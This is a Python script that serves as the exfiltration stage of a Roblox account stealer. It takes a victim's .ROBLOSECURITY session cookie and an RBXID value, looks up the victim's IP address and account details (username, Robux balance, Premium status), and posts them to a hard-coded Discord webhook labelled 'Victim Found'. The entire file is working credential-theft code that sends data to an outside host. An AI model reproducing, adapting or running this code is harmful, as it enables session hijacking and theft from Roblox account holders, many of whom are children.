import sys
import json
import subprocess

WEBHOOK = "https://discord.com/api/webhooks/1230636741879136420/fqfGqf7HnB_iti3I1SnBnk01exZzoo87NXpm_19DX6e9Djmf2fowW4HX26Of9lGZ4ZLv"

def get_ip_address():
    try:
        ip_address = subprocess.check_output(["curl", "-s", "https://api.ipify.org"]).decode().strip()
        return ip_address
    except Exception as e:
        print(f"Error retrieving IP address: {e}")
        return None

def main(roblo_security, rbxid_check):
    ip_addr = get_ip_address()

    statistics = None
    if roblo_security:
        try:
            roblo_security = roblo_security.strip()
            statistics = subprocess.check_output(["curl", "-s", "-H", f"Cookie: .ROBLOSECURITY={roblo_security}", "-L", "https://www.roblox.com/mobileapi/userinfo"]).decode().strip()
            statistics = json.loads(statistics)
        except Exception as e:
            print(f"Error retrieving statistics: {e}")

    data = {
        "content": None,
        "embeds": [
            {
                "description": f"```\n{roblo_security or 'COOKIE NOT FOUND'}\n```\n```\n{rbxid_check or 'COOKIE NOT FOUND'}\n```",
                "color": None,
                "fields": [
                    {
                        "name": "Username",
                        "value": statistics.get("UserName", "N/A"),
                        "inline": True
                    },
                    {
                        "name": "Robux",
                        "value": statistics.get("RobuxBalance", "N/A"),
                        "inline": True
                    },
                    {
                        "name": "Premium",
                        "value": statistics.get("IsPremium", "N/A"),
                        "inline": True
                    }
                ],
                "author": {
                    "name": f"Victim Found: {ip_addr}",
                    "icon_url": statistics.get("ThumbnailUrl", "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png")
                },
                "footer": {
                    "text": "sigma",
                    "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                },
                "thumbnail": {
                    "url": statistics.get("ThumbnailUrl", "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png")
                }
            }
        ],
        "username": "Roblox",
        "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
        "attachments": []
    }

    try:
        subprocess.run(["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", json.dumps(data), WEBHOOK], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error sending webhook: {e}")

if __name__ == "__main__":
    roblo_security = sys.argv[1] if len(sys.argv) > 1 else None
    rbxid_check = sys.argv[2] if len(sys.argv) > 2 else None
    main(roblo_security, rbxid_check)
